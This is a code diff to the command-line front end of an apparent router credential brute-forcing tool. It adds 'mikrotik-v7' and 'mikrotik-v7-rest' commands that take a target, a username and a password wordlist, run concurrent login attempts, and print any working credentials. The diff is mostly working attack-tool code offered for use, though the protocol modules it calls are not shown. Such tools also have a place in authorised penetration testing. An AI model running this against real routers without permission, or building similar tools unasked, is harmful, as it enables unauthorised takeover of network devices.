@@ -8,15 +8,15 @@ import (
 
 	"github.com/nimda/router-brute/internal/core"
 	"github.com/nimda/router-brute/internal/modules/mikrotik/v6"
-	"github.com/rs/zerolog"
+	"github.com/nimda/router-brute/internal/modules/mikrotik/v7"
+	"github.com/nimda/router-brute/internal/modules/mikrotik/v7/rest"
 	zlog "github.com/rs/zerolog/log"
 	"github.com/spf13/cobra"
 )
 
 var (
-	loggingMode string
-	debugMode   bool
-	traceMode   bool
+	debugMode bool
+	traceMode bool
 )
 
 var rootCmd = &cobra.Command{
@@ -41,6 +41,18 @@ var mikrotikV6Cmd = &cobra.Command{
 	Run:   runMikrotikV6,
 }
 
+var mikrotikV7Cmd = &cobra.Command{
+	Use:   "mikrotik-v7",
+	Short: "Brute force MikroTik RouterOS v7 (binary API)",
+	Run:   runMikrotikV7,
+}
+
+var mikrotikV7RestCmd = &cobra.Command{
+	Use:   "mikrotik-v7-rest",
+	Short: "Brute force MikroTik RouterOS v7 (REST API)",
+	Run:   runMikrotikV7Rest,
+}
+
 func init() {
 	// Global flags
 	rootCmd.PersistentFlags().BoolVar(&debugMode, "debug", false, "Enable debug logging")
@@ -58,7 +70,34 @@ func init() {
 	mikrotikV6Cmd.MarkFlagRequired("target")
 	mikrotikV6Cmd.MarkFlagRequired("wordlist")
 
+	// mikrotik-v7 flags
+	mikrotikV7Cmd.Flags().String("target", "", "Router IP address or hostname")
+	mikrotikV7Cmd.Flags().String("user", "admin", "Username to test")
+	mikrotikV7Cmd.Flags().String("wordlist", "", "Path to password wordlist file")
+	mikrotikV7Cmd.Flags().Int("workers", 5, "Number of concurrent workers")
+	mikrotikV7Cmd.Flags().String("rate", "100ms", "Rate limit between attempts")
+	mikrotikV7Cmd.Flags().Int("port", 8729, "Router API port (default: 8729)")
+	mikrotikV7Cmd.Flags().String("timeout", "10s", "Connection timeout")
+
+	mikrotikV7Cmd.MarkFlagRequired("target")
+	mikrotikV7Cmd.MarkFlagRequired("wordlist")
+
+	// mikrotik-v7-rest flags
+	mikrotikV7RestCmd.Flags().String("target", "", "Router IP address or hostname")
+	mikrotikV7RestCmd.Flags().String("user", "admin", "Username to test")
+	mikrotikV7RestCmd.Flags().String("wordlist", "", "Path to password wordlist file")
+	mikrotikV7RestCmd.Flags().Int("workers", 5, "Number of concurrent workers")
+	mikrotikV7RestCmd.Flags().String("rate", "100ms", "Rate limit between attempts")
+	mikrotikV7RestCmd.Flags().Int("port", 80, "HTTP port (default: 80)")
+	mikrotikV7RestCmd.Flags().Bool("https", false, "Use HTTPS instead of HTTP")
+	mikrotikV7RestCmd.Flags().String("timeout", "10s", "Connection timeout")
+
+	mikrotikV7RestCmd.MarkFlagRequired("target")
+	mikrotikV7RestCmd.MarkFlagRequired("wordlist")
+
 	rootCmd.AddCommand(mikrotikV6Cmd)
+	rootCmd.AddCommand(mikrotikV7Cmd)
+	rootCmd.AddCommand(mikrotikV7RestCmd)
 }
 
 func main() {
@@ -112,7 +151,7 @@ func runMikrotikV6(cmd *cobra.Command, args []string) {
 		Msg("Starting attack")
 
 	zlog.Debug().Msg("Creating Mikrotik v6 module")
-	module := v6.NewMikrotikV6Module(loggingMode)
+	module := v6.NewMikrotikV6Module()
 	module.Initialize(target, user, map[string]interface{}{
 		"port":    port,
 		"timeout": timeoutDuration,
@@ -175,6 +214,229 @@ func runMikrotikV6(cmd *cobra.Command, args []string) {
 		zlog.Info().Msg("No valid credentials found")
 	}
 	zlog.Debug().Msg("runMikrotikV6 function completed")
+}
+
+func runMikrotikV7(cmd *cobra.Command, args []string) {
+	target, _ := cmd.Flags().GetString("target")
+	user, _ := cmd.Flags().GetString("user")
+	wordlist, _ := cmd.Flags().GetString("wordlist")
+	workers, _ := cmd.Flags().GetInt("workers")
+	rateLimit, _ := cmd.Flags().GetString("rate")
+	port, _ := cmd.Flags().GetInt("port")
+	timeout, _ := cmd.Flags().GetString("timeout")
+
+	zlog.Debug().Msg("Starting runMikrotikV7 function")
+	zlog.Debug().
+		Str("target", target).
+		Str("user", user).
+		Str("wordlist", wordlist).
+		Int("workers", workers).
+		Str("rate", rateLimit).
+		Int("port", port).
+		Str("timeout", timeout).
+		Msg("Flags")
+
+	rateDuration, err := time.ParseDuration(rateLimit)
+	if err != nil {
+		zlog.Fatal().Err(err).Msg("Invalid rate limit")
+	}
+
+	timeoutDuration, err := time.ParseDuration(timeout)
+	if err != nil {
+		zlog.Fatal().Err(err).Msg("Invalid timeout")
+	}
+
+	zlog.Debug().Str("wordlist", wordlist).Msg("Loading passwords from")
+	passwords, err := loadPasswords(wordlist)
+	if err != nil {
+		zlog.Fatal().Err(err).Msg("Failed to load wordlist")
+	}
+	zlog.Debug().Int("n", len(passwords)).Msg("Loaded n passwords")
+
+	zlog.Info().
+		Str("target", target).
+		Int("passwords", len(passwords)).
+		Int("workers", workers).
+		Str("rate", rateLimit).
+		Msg("Starting RouterOS v7 attack")
+
+	zlog.Debug().Msg("Creating Mikrotik v7 module")
+	module := v7.NewMikrotikV7Module()
+	module.Initialize(target, user, map[string]interface{}{
+		"port":    port,
+		"timeout": timeoutDuration,
+	})
+
+	zlog.Debug().Int("workers", workers).Dur("ratelimit", rateDuration).Msg("Creating engine")
+	engine := core.NewEngine(workers, rateDuration)
+	engine.SetModule(module)
+	engine.LoadPasswords(passwords)
+
+	zlog.Debug().Msg("Starting engine...")
+	if err := engine.Start(); err != nil {
+		zlog.Fatal().Err(err).Msg("Failed to start engine")
+	}
+	zlog.Debug().Msg("Engine started successfully")
+
+	zlog.Debug().Msg("Waiting for results...")
+	successCount := 0
+	totalAttempts := 0
+
+	for result := range engine.Results() {
+		totalAttempts++
+		zlog.Trace().
+			Int("attempt", totalAttempts).
+			Str("password", result.Password).
+			Dur("elapsed", result.TimeConsumed).
+			Msg("Received result")
+
+		if result.Success {
+			successCount++
+			zlog.Info().
+				Str("username", result.Username).
+				Str("password", result.Password).
+				Str("target", result.Target).
+				Str("module", result.ModuleName).
+				Msg("✓ SUCCESS")
+
+			zlog.Debug().Msg("Found valid credentials, stopping engine...")
+			engine.Stop()
+			zlog.Debug().Msg("Engine stopped")
+			break
+		}
+
+		if totalAttempts%10 == 0 {
+			progress := engine.Progress() * 100
+			fmt.Printf("Progress: %.1f%% (%d/%d attempts)\r", progress, totalAttempts, len(passwords))
+		}
+	}
+
+	zlog.Debug().
+		Int("total_attempts", totalAttempts).
+		Int("successes", successCount).
+		Msg("Results loop completed")
+
+	zlog.Info().Msg("RouterOS v7 attack completed")
+	zlog.Info().Int("total_attempts", totalAttempts).Msg("Total attempts")
+	zlog.Info().Int("successful_attempts", successCount).Msg("Successful authentications")
+
+	if successCount == 0 {
+		zlog.Info().Msg("No valid credentials found")
+	}
+	zlog.Debug().Msg("runMikrotikV7 function completed")
+}
+
+func runMikrotikV7Rest(cmd *cobra.Command, args []string) {
+	target, _ := cmd.Flags().GetString("target")
+	user, _ := cmd.Flags().GetString("user")
+	wordlist, _ := cmd.Flags().GetString("wordlist")
+	workers, _ := cmd.Flags().GetInt("workers")
+	rateLimit, _ := cmd.Flags().GetString("rate")
+	port, _ := cmd.Flags().GetInt("port")
+	useHTTPS, _ := cmd.Flags().GetBool("https")
+	timeout, _ := cmd.Flags().GetString("timeout")
+
+	zlog.Debug().Msg("Starting runMikrotikV7Rest function")
+	zlog.Debug().
+		Str("target", target).
+		Str("user", user).
+		Str("wordlist", wordlist).
+		Int("workers", workers).
+		Str("rate", rateLimit).
+		Int("port", port).
+		Bool("https", useHTTPS).
+		Str("timeout", timeout).
+		Msg("Flags")
+
+	rateDuration, err := time.ParseDuration(rateLimit)
+	if err != nil {
+		zlog.Fatal().Err(err).Msg("Invalid rate limit")
+	}
+
+	timeoutDuration, err := time.ParseDuration(timeout)
+	if err != nil {
+		zlog.Fatal().Err(err).Msg("Invalid timeout")
+	}
+
+	zlog.Debug().Str("wordlist", wordlist).Msg("Loading passwords from")
+	passwords, err := loadPasswords(wordlist)
+	if err != nil {
+		zlog.Fatal().Err(err).Msg("Failed to load wordlist")
+	}
+	zlog.Debug().Int("n", len(passwords)).Msg("Loaded n passwords")
+
+	zlog.Info().
+		Str("target", target).
+		Int("passwords", len(passwords)).
+		Int("workers", workers).
+		Str("rate", rateLimit).
+		Msg("Starting RouterOS v7 REST API attack")
+
+	zlog.Debug().Msg("Creating Mikrotik v7 REST module")
+	module := rest.NewMikrotikV7RestModule()
+	module.Initialize(target, user, map[string]interface{}{
+		"port":    port,
+		"https":   useHTTPS,
+		"timeout": timeoutDuration,
+	})
+
+	zlog.Debug().Int("workers", workers).Dur("ratelimit", rateDuration).Msg("Creating engine")
+	engine := core.NewEngine(workers, rateDuration)
+	engine.SetModule(module)
+	engine.LoadPasswords(passwords)
+
+	zlog.Debug().Msg("Starting engine...")
+	if err := engine.Start(); err != nil {
+		zlog.Fatal().Err(err).Msg("Failed to start engine")
+	}
+	zlog.Debug().Msg("Engine started successfully")
+
+	zlog.Debug().Msg("Waiting for results...")
+	successCount := 0
+	totalAttempts := 0
+
+	for result := range engine.Results() {
+		totalAttempts++
+		zlog.Trace().
+			Int("attempt", totalAttempts).
+			Str("password", result.Password).
+			Dur("elapsed", result.TimeConsumed).
+			Msg("Received result")
+
+		if result.Success {
+			successCount++
+			zlog.Info().
+				Str("username", result.Username).
+				Str("password", result.Password).
+				Str("target", result.Target).
+				Str("module", result.ModuleName).
+				Msg("✓ SUCCESS")
+
+			zlog.Debug().Msg("Found valid credentials, stopping engine...")
+			engine.Stop()
+			zlog.Debug().Msg("Engine stopped")
+			break
+		}
+
+		if totalAttempts%10 == 0 {
+			progress := engine.Progress() * 100
+			fmt.Printf("Progress: %.1f%% (%d/%d attempts)\r", progress, totalAttempts, len(passwords))
+		}
+	}
+
+	zlog.Debug().
+		Int("total_attempts", totalAttempts).
+		Int("successes", successCount).
+		Msg("Results loop completed")
+
+	zlog.Info().Msg("RouterOS v7 REST API attack completed")
+	zlog.Info().Int("total_attempts", totalAttempts).Msg("Total attempts")
+	zlog.Info().Int("successful_attempts", successCount).Msg("Successful authentications")
+
+	if successCount == 0 {
+		zlog.Info().Msg("No valid credentials found")
+	}
+	zlog.Debug().Msg("runMikrotikV7Rest function completed")
 }
 
 func loadPasswords(filename string) ([]string, error) {
